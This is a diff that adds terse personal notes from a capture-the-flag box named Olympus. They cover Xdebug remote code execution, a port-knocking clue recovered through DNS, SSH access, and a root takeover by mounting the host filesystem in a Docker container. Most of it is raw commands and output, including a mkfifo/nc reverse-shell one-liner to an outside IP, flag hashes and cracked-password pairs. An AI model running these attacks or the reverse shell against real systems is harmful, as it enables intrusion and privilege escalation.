@@ -1,0 +1,243 @@
+Olympus
+
+http response:
+Xdebug: 2.5.5
+
+interesting header
+https://xdebug.org/docs/remote
+
+request:
+GET /?XDEBUG_SESSION_START=PHPSTORM HTTP/1.0
+Host: 10.10.10.83
+User-Agent: Haxkerfox 
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+Upgrade-Insecure-Requests: 1
+
+
+reply:
+HTTP/1.1 200 OK
+Date: Sun, 22 Apr 2018 18:18:47 GMT
+Server: Apache
+Set-Cookie: XDEBUG_SESSION=PHPSTORM; expires=Sun, 22-Apr-2018 19:18:47 GMT; Max-Age=3600; path=/
+Vary: Accept-Encoding
+X-Content-Type-Options: nosniff
+X-Frame-Options: sameorigin
+X-XSS-Protection: 1; mode=block
+Xdebug: 2.5.5
+Content-Length: 314
+
+
+..
+
+python xdebug-shell.py -l 10.10.15.83 -u http://10.10.10.83
+<?xml version="1.0" encoding="iso-8859-1"?>
+<init xmlns="urn:debugger_protocol_v1" xmlns:xdebug="http://xdebug.org/dbgp/xdebug" fileuri="file:///var/www/html/index.php" language="PHP" xdebug:language_version="7.1.12" protocol_version="1.0" appid="6875" idekey="JcyrAB"><engine version="2.5.5"><![CDATA[Xdebug]]></engine><author><![CDATA[Derick Rethans]]></author><url><![CDATA[http://xdebug.org]]></url><copyright><![CDATA[Copyright (c) 2002-2017 by Derick Rethans]]></copyright></init>
+>> ls
+<?xml version="1.0" encoding="iso-8859-1"?>
+<response xmlns="urn:debugger_protocol_v1" xmlns:xdebug="http://xdebug.org/dbgp/xdebug" command="eval" transaction_id="1"><property type="string" size="188" encoding="base64"><![CDATA[TVRJekxuUjRkQXBqWVhCMGRYSmxaQzVqWVhBS1kyOXlaUXBqY21WMFpTNWpjM01LWkhka1pIZGtMbkJvY0FwbVlYWnBZMjl1TG1samJ3cHBibVJsZUM1d2FIQUtiRzlzSUhCc2VpQmtiMjUwSUhSeVlYTm9JSFJvYVhNZ1ptOXNaR1Z5Q25Cb2NDMXlaWFpsY25ObExYTm9aV3hzTG5Cb2NBcHphR1ZzYkM1emFBcDZaWFZ6TG1wd1p3bz0=]]></property></response>
+123.txt
+captured.cap
+core
+crete.css
+dwddwd.php
+favicon.ico
+index.php
+lol plz dont trash this folder
+php-reverse-shell.php
+shell.sh
+zeus.jpg
+
+
+>> ls /home/zeus/airgeddon/captured
+<?xml version="1.0" encoding="iso-8859-1"?>
+<response xmlns="urn:debugger_protocol_v1" xmlns:xdebug="http://xdebug.org/dbgp/xdebug" command="eval" transaction_id="1"><property type="string" size="36" encoding="base64"><![CDATA[WTJGd2RIVnlaV1F1WTJGd0NuQmhjSGx5ZFhNdWRIaDBDZz09]]></property></response>
+captured.cap
+papyrus.txt
+
+papyrus:
+Captured while flying. I'll banish him to Olympia - Zeus
+
+from pcap:
+Too_cl0se_to_th3_Sun
+
+icarus@620b296204a3:~$ cat help_of_the_gods.txt 
+
+Athena goddess will guide you through the dark...
+
+Way to Rhodes...
+ctfolympus.htb
+
+    38 Apr 24 13:36 resolv.conf
+icarus@620b296204a3:/$ cat etc/hosts
+127.0.0.1	localhost
+::1	localhost ip6-localhost ip6-loopback
+fe00::0	ip6-localnet
+ff00::0	ip6-mcastprefix
+ff02::1	ip6-allnodes
+ff02::2	ip6-allrouters
+172.19.0.2	620b296204a3
+icarus@620b296204a3:/$ cat etc/resolv.conf 
+nameserver 127.0.0.11
+
+^C
+root@kali:~/htb/olympus# less nmap_initial_10.10.10.83.nmap 
+root@kali:~/htb/olympus# dig ctfolympus.htb @10.10.10.83
+
+; <<>> DiG 9.10.6-Debian <<>> ctfolympus.htb @10.10.10.83
+;; global options: +cmd
+;; Got answer:
+;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 20989
+;; flags: qr aa rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 2, ADDITIONAL: 3
+
+;; OPT PSEUDOSECTION:
+; EDNS: version: 0, flags:; udp: 4096
+;; QUESTION SECTION:
+;ctfolympus.htb.			IN	A
+
+;; ANSWER SECTION:
+ctfolympus.htb.		86400	IN	A	192.168.0.120
+
+;; AUTHORITY SECTION:
+ctfolympus.htb.		86400	IN	NS	ns2.ctfolympus.htb.
+ctfolympus.htb.		86400	IN	NS	ns1.ctfolympus.htb.
+
+;; ADDITIONAL SECTION:
+ns1.ctfolympus.htb.	86400	IN	A	192.168.0.120
+ns2.ctfolympus.htb.	86400	IN	A	192.168.0.120
+
+
+dig TXT ctfolympus.htb @10.10.10.83
+
+; <<>> DiG 9.10.6-Debian <<>> TXT ctfolympus.htb @10.10.10.83
+;; global options: +cmd
+;; Got answer:
+;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 23875
+;; flags: qr aa rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 2, ADDITIONAL: 3
+
+;; OPT PSEUDOSECTION:
+; EDNS: version: 0, flags:; udp: 4096
+;; QUESTION SECTION:
+;ctfolympus.htb.			IN	TXT
+
+;; ANSWER SECTION:
+ctfolympus.htb.		86400	IN	TXT	"prometheus, open a temporal portal to Hades (3456 8234 62431) and St34l_th3_F1re!"
+
+
+!! knock ports? as in CTF? and ssh with prometheus? 
+ 
+nmap -Pn --host_timeout 201 --max-retries 0  -p 3456 10.10.10.83
+nmap -Pn --host_timeout 201 --max-retries 0  -p 8234 10.10.10.83
+nmap -Pn --host_timeout 201 --max-retries 0  -p 62431 10.10.10.83
+ssh prometheus@10.10.10.83
+
+
+Welcome to
+                            
+    )         (             
+ ( /(     )   )\ )   (      
+ )\()) ( /(  (()/(  ))\ (   
+((_)\  )(_))  ((_))/((_))\  
+| |(_)((_)_   _| |(_)) ((_) 
+| ' \ / _` |/ _` |/ -_)(_-< 
+|_||_|\__,_|\__,_|\___|/__/ 
+                           
+prometheus@olympus:~$ ls -altr
+total 28
+-rw-r--r-- 1 prometheus prometheus  675 Apr  2 13:33 .profile
+-rw-r--r-- 1 prometheus prometheus  220 Apr  2 13:33 .bash_logout
+-rw-r----- 1 root       prometheus   33 Apr  4 14:07 user.txt
+drwxr-xr-x 3 root       root       4096 Apr  4 14:08 ..
+-rw-r--r-- 1 prometheus prometheus 3597 Apr  4 14:19 .bashrc
+-rw-r----- 1 root       prometheus  248 Apr  8 10:25 msg_of_gods.txt
+drwxr-xr-x 2 prometheus prometheus 4096 Apr  8 10:27 .
+-rw------- 1 root       root          0 Apr  8 10:52 .bash_history
+prometheus@olympus:~$ cat user.txt 
+8aa18519aff3c528c46bf675d6e88719
+prometheus@olympus:~$ cat msg_of_gods.txt 
+
+Only if you serve well to the gods, you'll be able to enter into the
+
+      _                           
+ ___ | | _ _ ._ _ _  ___  _ _  ___
+/ . \| || | || ' ' || . \| | |<_-<
+\___/|_|`_. ||_|_|_||  _/`___|/__/
+        <___'       |_|           
+
+
+
+
+privesc to root=? 
+/tmp
+drwxr-xr-x 5 root root 4096 Apr  8 00:34 pear
+
+
+
+root       423     1  0 08:07 ?        00:00:00 /usr/sbin/irqbalance --foreground
+root       575     1  0 08:07 ?        00:00:00 /usr/sbin/knockd -i enp0s3
+root       576     1  3 08:07 ?        00:00:11 /usr/bin/dockerd -H fd://
+root       593     1  0 08:07 ?        00:00:00 /usr/sbin/sshd -D
+root       597     1  0 08:07 tty1     00:00:00 /sbin/agetty --noclear tty1 linux
+root       601   576  0 08:07 ?        00:00:00 docker-containerd --config /var/run/docker/containerd/containerd.toml
+root       986   576  0 08:07 ?        00:00:00 /usr/bin/docker-proxy -proto tcp -host-ip 0.0.0.0 -host-port 80 -container-ip 172.20.0.2 -container-port 80
+root      1008   601  2 08:07 ?        00:00:06 docker-containerd-shim -namespace moby -workdir /var/lib/docker/containerd/daemon/io.containerd.runtime.v1.
+root      1023  1008  0 08:07 ?        00:00:00 apache2 -DFOREGROUND
+root      1130   576  0 08:07 ?        00:00:00 /usr/bin/docker-proxy -proto tcp -host-ip 0.0.0.0 -host-port 53 -container-ip 172.18.0.2 -container-port 53
+root      1142   576  0 08:07 ?        00:00:00 /usr/bin/docker-proxy -proto udp -host-ip 0.0.0.0 -host-port 53 -container-ip 172.18.0.2 -container-port 53
+www-data  1149  1023  0 08:07 ?        00:00:00 apache2 -DFOREGROUND
+root      1151   601  0 08:07 ?        00:00:00 docker-containerd-shim -namespace moby -workdir /var/lib/docker/containerd/daemon/io.containerd.runtime.v1.
+systemd+  1166  1151  0 08:07 ?        00:00:01 /usr/sbin/named -g -c /etc/bind/named.conf -u bind
+root      1176   576  0 08:07 ?        00:00:00 /usr/bin/docker-proxy -proto tcp -host-ip 0.0.0.0 -host-port 2222 -container-ip 172.19.0.2 -container-port 
+root      1183   601  0 08:07 ?        00:00:00 docker-containerd-shim -namespace moby -workdir /var/lib/docker/containerd/daemon/io.containerd.runtime.v1.
+root      1207  1183  0 08:07 ?        00:00:00 /usr/sbin/sshd -D
+www-data  1284  1023  0 08:07 ?        00:00:00 apache2 -DFOREGROUND
+www-data  1313  1149  0 08:07 ?        00:00:00 sh -c rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.182 1234 >/tmp/f
+
+
+prometheus@olympus:~$ groups
+prometheus cdrom floppy audio dip video plugdev netdev bluetooth docker
+
+root       593     1  0 08:07 ?        00:00:00 /usr/sbin/sshd -D
+root       597     1  0 08:07 tty1     00:00:00 /sbin/agetty --noclear tty1 linux
+root       601   576  0 08:07 ?        00:00:01 docker-containerd --config /var/run/docker/containerd/containerd.toml
+root       986   576  0 08:07 ?        00:00:00 /usr/bin/docker-proxy -proto tcp -host-ip 0.0.0.0 -host-port 80 -container-ip 172.20.0.2 -container-port 80
+root      1008   601  2 08:07 ?        00:00:12 docker-containerd-shim -namespace moby -workdir /var/lib/docker/containerd/daemon/io.containerd.runtime.v1.linux/moby/f00ba96171c58d55c6bf1a2e6796dca8c36e565d7aacfcc3bcd593c9214edcf9 -address /var/run/docker/containerd/docker-containerd.sock -containerd-binary /usr/bin/docker-containerd -runtime-root /var/run/docker/runtime-runc
+root      1023  1008  0 08:07 ?        00:00:00 apache2 -DFOREGROUND
+root      1130   576  0 08:07 ?        00:00:00 /usr/bin/docker-proxy -proto tcp -host-ip 0.0.0.0 -host-port 53 -container-ip 172.18.0.2 -container-port 53
+root      1142   576  0 08:07 ?        00:00:00 /usr/bin/docker-proxy -proto udp -host-ip 0.0.0.0 -host-port 53 -container-ip 172.18.0.2 -container-port 53
+root      1151   601  0 08:07 ?        00:00:00 docker-containerd-shim -namespace moby -workdir /var/lib/docker/containerd/daemon/io.containerd.runtime.v1.linux/moby/ce2ecb56a96ee3d95de690b81aa91069f3c8d9f41ec20bd866650e987a4e9811 -address /var/run/docker/containerd/docker-containerd.sock -containerd-binary /usr/bin/docker-containerd -runtime-root /var/run/docker/runtime-runc
+root      1176   576  0 08:07 ?        00:00:00 /usr/bin/docker-proxy -proto tcp -host-ip 0.0.0.0 -host-port 2222 -container-ip 172.19.0.2 -container-port 22
+root      1183   601  0 08:07 ?        00:00:00 docker-containerd-shim -namespace moby -workdir /var/lib/docker/containerd/daemon/io.containerd.runtime.v1.linux/moby/620b296204a38a1bc2fb40546dead31c9bf52d12f5fac64925999734e710e419 -address /var/run/docker/containerd/docker-containerd.sock -containerd-binary /usr/bin/docker-containerd -runtime-root /var/run/docker/runtime-runc
+root      1207  1183  0 08:07 ?       
+
+
+https://www.projectatomic.io/blog/2015/08/why-we-dont-let-non-root-users-run-docker-in-centos-fedora-or-rhel/
+docker run -v /:/hostOS -i -t chrisfosterelli/rootplease
+
+cat /pwned/root/root.txt
+aba486990e2e849e25c23f6e41e5e303
+root@62d2cee378f2:/home/zeus/airgeddon# 
+
+   33  docker build --tag pwner .
+   34  docker run -v /:/pwned -t -i pwner:latest
+cat Dockerfile
+FROM crete:latest
+
+CMD ["/bin/bash"]
+
+
+13fa8abd10eed98d89fd6fc678afaf94
+33903fbcc0b1046a09edfaa0a65e8f8c
+370fc3559c9f0bff80543f2e1151c537
+719da165a626b4cf23b626896c213b84
+d322dc36451587ea2994c84c9d9717a1
+d459f76a5eeeed0eca8ab4476c144ac4
+
+
+ umkm3t 370fc332c0fcb86b528f0253c4dcdbd7 rufea 370fc341403f7af8044d6688f254541b yorkshire1988 370fc3559c9f0bff80543f2e1151c537 xNnWo6272k7x 370fc35f68bc06e4f07c1c9a1109de2b new2spew 370fc39586cc60ba439be19048992eb8 07701349 370fc396234683943024f8c6fee66cc8 INLOVEWITgod ...
+ 
+ 
+ xNnWo6272k7x is  : 370fc3559c9f0bff80543f2e1151c537
+ yorkshire1988 is : 370fc341403f7af8044d6688f254541b
